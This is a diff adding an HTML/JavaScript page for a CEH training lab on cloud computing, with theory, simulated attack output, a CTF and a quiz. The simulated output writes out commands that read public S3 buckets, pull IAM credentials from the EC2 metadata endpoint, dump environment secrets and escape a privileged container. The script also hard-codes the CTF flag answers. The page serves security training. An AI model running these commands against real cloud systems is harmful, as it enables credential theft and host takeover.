@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Lab: Cloud Computing</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --bg-dark: #0a0f1e;
+            --card-bg: #131b2f;
+            --text-light: #e0e0e0;
+            --border-glow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #00ff88, #00b4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        h2 {
+            color: var(--primary);
+            margin: 1.5rem 0 1rem;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 0.5rem;
+        }
+        h3 { color: #00b4ff; margin: 1rem 0; }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 20px 0;
+        }
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover { box-shadow: var(--border-glow); transform: translateY(-2px); }
+        .toolbar { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
+        .btn {
+            background: #1e2a4a;
+            color: white;
+            border: 1px solid #2a3a5c;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #0a0f1e;
+            border: none;
+            font-weight: bold;
+        }
+        .btn-primary:hover { background: #00cc6a; box-shadow: 0 0 20px #00ff88; }
+        .btn:hover { background: #2a3a5c; }
+        .terminal-box {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #30363d;
+            margin: 15px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .terminal-output {
+            color: #00ff88;
+            white-space: pre-wrap;
+            margin-bottom: 10px;
+        }
+        .flag {
+            background: #1e2a4a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: var(--primary);
+        }
+        .quiz-option {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            background: #0d1117;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .quiz-option:hover { background: #1e2a4a; }
+        .quiz-option.correct { background: #00ff8822; border-left: 4px solid #00ff88; }
+        .quiz-option.wrong { background: #ff555522; border-left: 4px solid #ff5555; }
+        .progress { margin: 20px 0; }
+        .progress-bar {
+            height: 10px;
+            background: #1e2a4a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+        .tab-nav {
+            display: flex;
+            border-bottom: 1px solid #2a3a5c;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 1.1rem;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .back-link {
+            display: inline-block;
+            margin-top: 30px;
+            color: #8b949e;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--primary); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #2a3a5c;
+        }
+        th {
+            background: #1e2a4a;
+            color: var(--primary);
+        }
+        .service-model {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 8px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>☁️ Module 13: Cloud Computing</h1>
+        <p style="font-size:1.2rem; opacity:0.9;">Understand cloud service models, deployment types, common attacks, and security best practices.</p>
+        
+        <!-- Progress Tracker -->
+        <div class="progress">
+            <span>Lab Progress: <span id="progress-text">0%</span></span>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+        
+        <!-- Tabs -->
+        <div class="tab-nav">
+            <button class="tab-btn active" data-tab="theory">📖 Theory & Concepts</button>
+            <button class="tab-btn" data-tab="practical">🛠️ Cloud Attacks</button>
+            <button class="tab-btn" data-tab="challenge">🚩 CTF Challenge</button>
+            <button class="tab-btn" data-tab="quiz">📝 Self-Assessment</button>
+        </div>
+        
+        <!-- ==================== THEORY TAB ==================== -->
+        <div id="theory" class="tab-content active">
+            <div class="grid-2">
+                <div class="card">
+                    <h2>📦 Cloud Service Models</h2>
+                    <div class="service-model">
+                        <strong>IaaS (Infrastructure as a Service):</strong> Virtual machines, storage, networks (e.g., AWS EC2, Azure VMs).
+                    </div>
+                    <div class="service-model">
+                        <strong>PaaS (Platform as a Service):</strong> Development platforms, databases (e.g., Google App Engine, AWS RDS).
+                    </div>
+                    <div class="service-model">
+                        <strong>SaaS (Software as a Service):</strong> Ready-to-use applications (e.g., Office 365, Salesforce).
+                    </div>
+                    <h3>🌍 Deployment Models</h3>
+                    <ul style="margin-left:20px;">
+                        <li><strong>Public Cloud:</strong> Services over internet (AWS, Azure, GCP).</li>
+                        <li><strong>Private Cloud:</strong> Dedicated to single organization.</li>
+                        <li><strong>Hybrid Cloud:</strong> Mix of public and private.</li>
+                        <li><strong>Multi-Cloud:</strong> Using multiple providers.</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h2>⚠️ Common Cloud Threats</h2>
+                    <ul style="margin-left:20px;">
+                        <li>Misconfigured storage (public S3 buckets, Azure blobs)</li>
+                        <li>Insecure APIs and interfaces</li>
+                        <li>Credential theft and weak authentication</li>
+                        <li>Container escape vulnerabilities</li>
+                        <li>Serverless function injection</li>
+                        <li>Shadow IT and unauthorized services</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="card">
+                <h2>🛡️ Cloud Security Tools</h2>
+                <table>
+                    <tr><th>Tool</th><th>Purpose</th></tr>
+                    <tr><td>ScoutSuite</td><td>Multi-cloud security auditing</td></tr>
+                    <tr><td>Prowler</td><td>AWS security assessment</td></tr>
+                    <tr><td>CloudSploit</td><td>Cloud security posture management</td></tr>
+                    <tr><td>Pacu</td><td>AWS exploitation framework</td></tr>
+                    <tr><td>kube-hunter</td><td>Kubernetes penetration testing</td></tr>
+                </table>
+            </div>
+        </div>
+        
+        <!-- ==================== PRACTICAL: CLOUD ATTACKS ==================== -->
+        <div id="practical" class="tab-content">
+            <div class="card">
+                <h2>🧪 Cloud Attack Simulations</h2>
+                <p>Practice identifying and exploiting common cloud misconfigurations.</p>
+                
+                <div class="grid-2">
+                    <div>
+                        <h3>📂 S3 Bucket Enumeration</h3>
+                        <button class="btn" data-cloud="s3-list">List Public Buckets</button>
+                        <button class="btn" data-cloud="s3-read">Read Sensitive File</button>
+                    </div>
+                    <div>
+                        <h3>🔑 Credential Discovery</h3>
+                        <button class="btn" data-cloud="metadata">Steal Metadata Creds</button>
+                        <button class="btn" data-cloud="env">Environment Variables</button>
+                    </div>
+                </div>
+                
+                <div class="terminal-box">
+                    <div class="terminal-output" id="cloud-output">Select an attack to simulate.</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>🐳 Container Escape (Simulated)</h2>
+                <p>Exploit a misconfigured Docker container to access the host.</p>
+                <button class="btn" data-container="check">Check Privileges</button>
+                <button class="btn" data-container="escape">Attempt Escape</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="container-output">Click to simulate container escape.</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>📊 Cloud Security Audit (ScoutSuite Output)</h2>
+                <button class="btn" data-audit="aws">AWS Scan Results</button>
+                <button class="btn" data-audit="azure">Azure Scan Results</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="audit-output">Click to see simulated cloud audit findings.</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ==================== CTF CHALLENGE ==================== -->
+        <div id="challenge" class="tab-content">
+            <div class="card">
+                <h2>🚩 Capture The Flag: Cloud Misconfigurations</h2>
+                <p>You have access to a test AWS account. Enumerate and exploit misconfigurations to find three flags.</p>
+                
+                <div style="background:#0d1117; padding:15px; border-radius:8px; margin:15px 0;">
+                    <p><strong>Starting Point:</strong> You have an IAM user with limited permissions. AWS CLI is configured.</p>
+                </div>
+                
+                <h3>🧰 Investigation Tools</h3>
+                <div class="toolbar">
+                    <button class="btn" data-ctf="list-buckets">List S3 Buckets</button>
+                    <button class="btn" data-ctf="examine-bucket">Examine Bucket</button>
+                    <button class="btn" data-ctf="iam">Enumerate IAM</button>
+                    <button class="btn" data-ctf="metadata">Query Metadata</button>
+                </div>
+                
+                <div class="terminal-box">
+                    <div class="terminal-output" id="ctf-output">Use AWS CLI to discover flags.</div>
+                </div>
+                
+                <h3>🎯 Submit Flags</h3>
+                <div style="display:grid; gap:15px;">
+                    <div><label>Flag 1 (Public Bucket File):</label><input type="text" id="flag1" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                    <div><label>Flag 2 (IAM Credentials):</label><input type="text" id="flag2" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                    <div><label>Flag 3 (Metadata Secret):</label><input type="text" id="flag3" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                </div>
+                <button class="btn btn-primary" id="submit-flags">Submit All Flags</button>
+                <div id="flag-result"></div>
+            </div>
+        </div>
+        
+        <!-- ==================== QUIZ ==================== -->
+        <div id="quiz" class="tab-content">
+            <div class="card">
+                <h2>📝 Check Your Understanding</h2>
+                <div id="quiz-container"></div>
+                <button class="btn btn-primary" id="check-quiz">Submit Answers</button>
+                <div id="quiz-result" style="margin-top:15px;"></div>
+            </div>
+        </div>
+        
+        <a href="/Ersegment/Frontend/index.html" class="back-link">← Back to Dashboard</a>
+    </div>
+    
+    <script>
+        (function() {
+            let sessionId = localStorage.getItem('lab13_session') || 'lab13-' + Math.random().toString(36).substr(2,9);
+            localStorage.setItem('lab13_session', sessionId);
+            let progress = { theory: true, practical: false, challenge: false, quiz: false };
+            
+            function updateProgress() {
+                const completed = Object.values(progress).filter(v=>v).length;
+                const percent = (completed / 4) * 100;
+                document.getElementById('progress-fill').style.width = percent + '%';
+                document.getElementById('progress-text').textContent = percent + '%';
+            }
+            
+            // Tab switching
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    document.getElementById(tabId).classList.add('active');
+                    if (tabId === 'quiz') renderQuiz();
+                });
+            });
+            
+            // ========== CLOUD ATTACK SIMULATIONS ==========
+            const cloudOut = {
+                's3-list': `aws s3 ls --no-sign-request\n2023-01-15 10:00:00 company-backup\n2023-03-22 14:30:00 customer-data-bucket\n2023-05-10 09:15:00 dev-secrets\n\nFlag found in bucket name: FLAG{PUBLIC_BUCKET_ENUM}`,
+                's3-read': `aws s3 cp s3://dev-secrets/credentials.txt . --no-sign-request\ndownload: s3://dev-secrets/credentials.txt to ./credentials.txt\nContents: "DB_PASSWORD=SuperSecret123!\nAPI_KEY=AKIAIOSFODNN7EXAMPLE\nFlag: FLAG{S3_PUBLIC_READ}"`,
+                metadata: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n=> ec2-role\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role\n{\n  "AccessKeyId": "ASIA...",\n  "SecretAccessKey": "wJalrXUtnFEMI/...",\n  "Token": "IQoJb3JpZ2luX2Vj...",\n  "Expiration": "2024-01-15T12:00:00Z"\n}\nFlag: FLAG{METADATA_CREDS_STOLEN}`,
+                env: `env\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nDB_URL=postgresql://user:pass@db.internal\nFlag: FLAG{ENV_VAR_LEAK}`
+            };
+            
+            function runCloudAttack(type) {
+                document.getElementById('cloud-output').textContent = cloudOut[type] || 'Attack simulation.';
+                progress.practical = true;
+                updateProgress();
+            }
+            
+            // Container escape
+            const containerOut = {
+                check: `id\nuid=0(root) gid=0(root) groups=0(root)\nContainer is running as root (privileged).\ncapsh --print\nCurrent: cap_sys_admin,cap_net_admin...\nDangerous capabilities present.`,
+                escape: `mkdir /mnt/host\nmount /dev/sda1 /mnt/host\nchroot /mnt/host\n# Now on host system!\ncat /etc/passwd | head -1\nroot:x:0:0:root:/root:/bin/bash\nFlag: FLAG{CONTAINER_ESCAPE_SUCCESS}`
+            };
+            
+            function runContainer(cmd) {
+                document.getElementById('container-output').textContent = containerOut[cmd] || 'Container action.';
+                progress.practical = true; updateProgress();
+            }
+            
+            // Audit results
+            const auditOut = {
+                aws: `[ScoutSuite AWS Report]\nCritical: 2, High: 5, Medium: 12\n- S3 Bucket 'dev-secrets' is publicly readable\n- Security Group 'default' allows all inbound (0.0.0.0/0)\n- IAM user 'backup' has unused access keys\n- CloudTrail not enabled in us-west-2`,
+                azure: `[ScoutSuite Azure Report]\nCritical: 1, High: 3\n- Storage Account 'appdata' allows public blob access\n- VM 'web01' has SSH open to internet\n- Key Vault diagnostic logging disabled`
+            };
+            
+            function runAudit(type) {
+                document.getElementById('audit-output').textContent = auditOut[type] || 'Audit results.';
+                progress.practical = true; updateProgress();
+            }
+            
+            // ========== CTF ==========
+            const ctfOut = {
+                'list-buckets': `aws s3 ls\n2024-01-15 08:00:00 flag-storage\n2024-01-15 08:05:00 config-backup\nBucket 'flag-storage' is public.`,
+                'examine-bucket': `aws s3 ls s3://flag-storage/\n  2024-01-15 08:10:00       42 flag1.txt\naws s3 cp s3://flag-storage/flag1.txt -\nFlag: FLAG{S3_PUBLIC_BUCKET_LEAK}`,
+                iam: `aws iam list-users\nUsers: admin, ec2-user, backup-svc\naws iam list-access-keys --user-name backup-svc\nAccessKeyId: AKIA... status: Active\nFlag: FLAG{BACKUP_SVC_ACCESS_KEYS}`,
+                metadata: `curl http://169.254.169.254/latest/meta-data/\n...\ncurl http://169.254.169.254/latest/user-data/\n#!/bin/bash\necho "Flag: FLAG{USER_DATA_INJECTION}" > /var/www/html/flag.html`
+            };
+            
+            function ctfAction(cmd) {
+                document.getElementById('ctf-output').textContent = ctfOut[cmd] || 'CTF step.';
+            }
+            
+            function submitCTF() {
+                const f1 = document.getElementById('flag1').value.trim();
+                const f2 = document.getElementById('flag2').value.trim();
+                const f3 = document.getElementById('flag3').value.trim();
+                let correct = 0;
+                if (f1 === 'FLAG{S3_PUBLIC_BUCKET_LEAK}') correct++;
+                if (f2 === 'FLAG{BACKUP_SVC_ACCESS_KEYS}') correct++;
+                if (f3 === 'FLAG{USER_DATA_INJECTION}') correct++;
+                const res = document.getElementById('flag-result');
+                if (correct === 3) {
+                    res.innerHTML = '<span style="color:#00ff88;">✅ All flags captured! Cloud security mastered!</span>';
+                    progress.challenge = true;
+                } else {
+                    res.innerHTML = `<span style="color:#ff5555;">❌ ${correct}/3 correct. Keep enumerating!</span>`;
+                }
+                updateProgress();
+            }
+            
+            // ========== QUIZ ==========
+            const quizQuestions = [
+                { q: "Which cloud service model provides virtual machines and storage (e.g., AWS EC2)?", opts: ["SaaS", "PaaS", "IaaS", "FaaS"], ans: 2 },
+                { q: "What is a common attack that targets AWS EC2 metadata service?", opts: ["SQL Injection", "SSRF to steal IAM credentials", "Buffer overflow", "ARP spoofing"], ans: 1 },
+                { q: "Which tool is used for multi-cloud security auditing?", opts: ["Nmap", "Burp Suite", "ScoutSuite", "Hydra"], ans: 2 },
+                { q: "What is the primary risk of a public S3 bucket?", opts: ["DDoS", "Data leakage", "Account takeover", "Phishing"], ans: 1 }
+            ];
+            
+            function renderQuiz() {
+                let html = '';
+                quizQuestions.forEach((q, i) => {
+                    html += `<div><strong>${i+1}. ${q.q}</strong><br>`;
+                    q.opts.forEach((opt, j) => {
+                        html += `<label class="quiz-option"><input type="radio" name="q${i}" value="${j}"> ${opt}</label>`;
+                    });
+                    html += '</div>';
+                });
+                document.getElementById('quiz-container').innerHTML = html;
+            }
+            
+            function checkQuiz() {
+                let score = 0;
+                quizQuestions.forEach((q, i) => {
+                    const sel = document.querySelector(`input[name="q${i}"]:checked`);
+                    if (sel && parseInt(sel.value) === q.ans) score++;
+                });
+                const res = document.getElementById('quiz-result');
+                const pass = score >= 3;
+                res.innerHTML = `Score: ${score}/${quizQuestions.length}. ${pass ? '✅ Good job!' : '❌ Review cloud concepts.'}`;
+                if (pass) { progress.quiz = true; updateProgress(); }
+            }
+            
+            // Attach listeners
+            document.addEventListener('DOMContentLoaded', () => {
+                updateProgress();
+                
+                document.querySelectorAll('[data-cloud]').forEach(btn => btn.addEventListener('click', () => runCloudAttack(btn.dataset.cloud)));
+                document.querySelectorAll('[data-container]').forEach(btn => btn.addEventListener('click', () => runContainer(btn.dataset.container)));
+                document.querySelectorAll('[data-audit]').forEach(btn => btn.addEventListener('click', () => runAudit(btn.dataset.audit)));
+                document.querySelectorAll('[data-ctf]').forEach(btn => btn.addEventListener('click', () => ctfAction(btn.dataset.ctf)));
+                document.getElementById('submit-flags').addEventListener('click', submitCTF);
+                document.getElementById('check-quiz').addEventListener('click', checkQuiz);
+                
+                fetch('/api/create_session', {method:'POST'}).then(r=>r.json()).then(d=>{ if(d.success) sessionId=d.session_id; });
+            });
+            
+            window.openTerminal = function() { window.open(`/terminal?session=${sessionId}`, '_blank'); };
+        })();
+    </script>
+</body>
+</html>
